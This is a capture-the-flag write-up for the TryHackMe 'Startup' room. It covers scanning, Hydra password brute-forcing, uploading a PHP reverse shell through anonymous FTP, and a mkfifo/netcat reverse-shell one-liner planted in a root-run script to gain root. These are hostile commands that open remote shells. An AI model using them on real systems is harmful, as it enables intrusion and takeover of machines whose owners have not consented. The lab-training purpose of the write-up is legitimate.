# [Startup THM Room](https://tryhackme.com/room/startup)
## Scanning
### Nmap
```
nmap -sC -sV -oN nmapInitial target-ip
```

```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-12-13 16:41 GMT
Nmap scan report for ip-10-10-96-168.eu-west-1.compute.internal (target-ip)
Host is up (0.00035s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.37.247
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
MAC Address: 02:2A:5F:73:C5:79 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
```

### Gobuster
```
gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```go
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/12/13 16:42:58 Starting gobuster
===============================================================
/files (Status: 301)
/server-status (Status: 403)
===============================================================
2023/12/13 16:43:18 Finished
===============================================================
```

## Enumeration
- With our scanning done, we can see that the target machine is hosting a website. We can navigate to that and peruse around. When we get there, this is what we see:

![No Spice Here](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/1efa83be-c46b-407b-b079-f97332feb787)


- Though there isn't anything outwardly obvious here, we can still poke around by viewing the page source and stuff like that. When we do, we can see the following comment in the HTML:
```html
<!--when are we gonna update this??-->
```

- This could be a clue moving forward, especially if the web application is using something that is out of date with known vulnerabilities. Let's move on for now.
- We know that there is a directory on this web app called `/files` thanks to our [Gobuster](https://github.com/OJ/gobuster) scan. Let's navigate there and see what we can see:

![Index of Files Directory](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/94e0d8f8-bc76-4242-81f4-85eeb95e449e)


- There seems to be a few juicy things we can look at in this directory. First, let's take a look at the `notice.txt` file. Here are the contents:
```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

- This little message doesn't give us too much, but it does give us a potential username, since we can assume the Maya this note references is a developer/employee of this organization. Now let's take a look at the `important.jpg` file:

![Important JPG in Files Directory](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/cfc9c478-1dfb-4287-986d-3c7a883666de)


- It looks like a silly little Among Us meme. Let's pull that down in case we need to do some further enumeration on it. We can do that with the following command:
```
curl http://target-ip/files/important.jpg --output important.jpg
```

- When we go back to the `/files` directory and check out the `ftp` folder, there doesn't seem to be anything there. Let's pivot and move on.
- Let's go revisit this meme that we have gotten. We can use something like [Strings](https://www.howtoforge.com/linux-strings-command/) and [Binwalk](https://github.com/ReFirmLabs/binwalk) to search the file for any hidden or embedded things of interest. Let's start with `strings important.jpg`.
- Well, that didn't give us anything noteworthy. Let's try using [Binwalk](https://github.com/ReFirmLabs/binwalk) with the following syntax:
```
binwalk -e important.jpg
```

- Once again, we aren't given anything worthwhile. Let's move away from the meme and reevaluate our options.
- We have what we assume to be a username, so it is possible to try to brute force one of the other protocols like FTP or SSH with it and a wordlist. Let's start by using [Hydra](https://github.com/vanhauser-thc/thc-hydra) on the FTP service:
```
hydra -l maya -P /usr/share/wordlists/rockyou.txt ftp://target-ip
```

- FTP doesn't seem to yield anything. Let's pivot to SSH. 
```
hydra -l maya -P /usr/share/wordlists/rockyou.txt ssh://target-ip
```

- SSH hasn't provided us anything either. We should take a step back and reconsider how to approach this challenge. 
- Looking back through our [Nmap](https://nmap.org/) scan, we can see that FTP anonymous login is enabled. However, if we login in anonymously and look at it, it seems like it just lists the same files we found in the `/files` directory. 
- It seems somewhat strange that the `/ftp` directory is there on the FTP server and the web page. Furthermore, there isn't anything inside that `/ftp` folder. Maybe we can upload something to the FTP server and see it inside our web browser. We can test this theory by creating a simple `test.txt` file and using the `put` command in our terminal when connected to the FTP service in the FTP folder. Here's what that looks like:
```sh
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxr-x    1 112      118             0 Dec 13 18:03 test.txt
226 Directory send OK.
ftp> 
```

- It looks like we can upload files to this FTP server. Let's navigate back to the `/files/ftp` directory and see if it is there:

![Test File Uploaded to FTP Server](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/aa5faaf9-70d0-4633-ad72-c6cb992ada4f)


- Success! Since we can upload files to our machine and access it through the web browser, we can try to leverage some reverse shell payloads to try and gain a foothold onto the system. \

## System Hacking
- If you're using the THM AttackBox like I am, you may know that it comes with some webshells already present on it that we can leverage. If you aren't or don't have it, you can grab it from [this GitHub repo](https://github.com/pentestmonkey/php-reverse-shell). I'm going to copy it over to my working directory with the following command:
```
cp /usr/share/webshells/php/php-reverse-shell.php ~/Startup
```

- Now that we have that in our working directory, let's take a look at in and edit whatever options we need to (like port number and IP addresses, for example) and add those as necessary. 
- Once all the necessary options have been changed, we can upload it to the FTP server with these commands:
```sh
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5494 bytes sent in 0.00 secs (98.8582 MB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxr-x    1 112      118          5494 Dec 13 18:19 php-reverse-shell.php
-rwxrwxr-x    1 112      118             0 Dec 13 18:03 test.txt
226 Directory send OK.
```

- Now that it's there, let's go back to the web server and see if it is present:

![Rev Shell Loaded](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/e81ad760-03ab-4222-b76a-8d4357598185)


- It seems to be. Before we can click on that `php-reverse-shell.php` file to execute it, we have to start a [Netcat](https://sectools.org/tool/netcat/) listener to catch to call back to our machine and establish a shell. This is the syntax we can use:
```
nc -lnvp 8888
```

- Here is a breakdown of this command:
	- `-lnvp` - This specifies that we want [Netcat](https://sectools.org/tool/netcat/) to listen for incoming connections (`-l`), suppress name/port resolutions (`-n`), give us verbose information (`-v`), and specifies a port number (`-p`), which is 8888 in this case. 
- Now that our [Netcat](https://sectools.org/tool/netcat/) listener is running, we can click on the `php-reverse-shell.php` file in our web browser to execute the script. If all goes according to plan, this is what we should see:
```
Connection from target-ip 53886 received!
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:25:43 up  1:45,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

- Great! We have a foothold on the box. However, it's a little unstable and doesn't support functionality like tab to autocomplete and command history. We can stabilize the shell using Python's `pty` module and the following syntax:
```sh
python -c 'import pty; pty.spawn("/bin/bash")
```

- Now that we have a stable shell, we can use `whoami` to see what user we are. From there, we can try to pivot to others to get more permissions and, eventually, root access:
```
www-data@startup:/$ whoami
www-data
www-data@startup:/$ 
```

- When we land on the box, we are in the `/` directory. If we `ls` the contents of this directory, we can see a file called `recipe.txt`. If we open this file, here is what it says:
```
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

- If we navigate over to the `/home` directory, we can see that there is one present named `lennie`, which we can assume is a user on the machine. Let's try to get access to the `lennie` user so we can see what they can do. 
- If we keep looking around in `/` , we can see an `/incident` directory. If we hop in there, it seems like there is a `suspicious.pcapng` file. We should get this and take a look at it. One way to do this is to spin up a simple Python web server on the target box and pull the file down from our attacker machine. 
- First, let's start the web server on the target machine:
```python
python -m http.server
```

- Next, let's grab the `suspicious.pcapng` file from our attacker machine:
```
wget http://target-ip:8000/suspicious.pcapng
```

- Now that we have that file, let's look at it with [Wireshark](https://www.wireshark.org) and see if we can find anything worthwhile. 
- After looking around a bit, we can find some interesting stuff. First, if we follow TCP stream 7 with the filter `tcp.stream eq 7`, we can see that what seems to be an intrusion leveraging the same techniques we used to get access to the box:

![Wireshark Analysis Data](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/4a9b3bde-fc0e-4fb6-a991-fe8f9fb0af96)


- It looks like the attacker has a potential password, but they are attempting to enter it for the `www-data` user and not the `lennie` user. Let's try to leverage that password to become `lennie`. 
- That worked, and now we are `lennie`. We can navigate to his home directory and grab the user flag.

## Privilege Escalation
- Now that we are a low privileged user on the target machine, we can look for ways to escalate privileges. We can do the basic things like `sudo -l` and the like, but they don't seem to pan out. However, there is a `/scripts` folder in the `lennie` home directory that may be worth looking at. 
- When we hop into that directory and `ls` the contents, we can see two files. One is `planner.sh` and the other is `startup_list.txt`. Let's start by looking at the `startup_list.txt` file. There doesn't seem to be any content in the file, so let's look at the `planner.sh` file. Here is what we have found:
```
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

- Now, when we look at the permissions for these files, we can see the following:
```sh
lennie@startup:~/scripts$ ls -la
ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Dec 13 19:40 startup_list.txt
```

- The two files in the `/scripts` directory are owned by root, which mean they run with root permissions. The `planner.sh` script references a file at `/etc/print.sh`. Now we can't directly edit the `planner.sh` script, but we may be able to do something to the script it references. Let's look into this further. Here is the content of the `/etc/print.sh` file:
```sh
#!/bin/bash
echo "Done!"
```

- It doesn't seem like anything is happening. But if we check the read/write permissions with `ls -la`, we see this:
```
-rwx------  1 lennie lennie    25 Nov 12  2020 print.sh
```

- Lennie is the owner of this file, meaning he can write to it. We can use `vim` to edit this file, and we can replace the contents with something that might call back to a [Netcat](https://sectools.org/tool/netcat/) listener we have running on our attacking machine. Since the script that calls it (`planner.sh`) is running with root permissions, there is a good chance it'll give us a shell with root access. Let's try it. 
- On our attacking machine, we can set up a [Netcat](https://sectools.org/tool/netcat/) listener on a different port than our PHP reverse shell:
```
nc -lnvp 4444
```

- Now we just add the following syntax to the `/etc/print.sh` file:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc target-ip 4444 >/tmp/f
```

- Let's try to run the `planner.sh` script and see what happens. Back at our [Netcat](https://sectools.org/tool/netcat/) session, we are greeted with this:
```
Connection from target-ip 36274 received!
/bin/sh: 0: can't access tty; job control turned off
# ls
root.txt
# 
```

- From here, we can grab that `root.txt` file and call this box finished. 
 
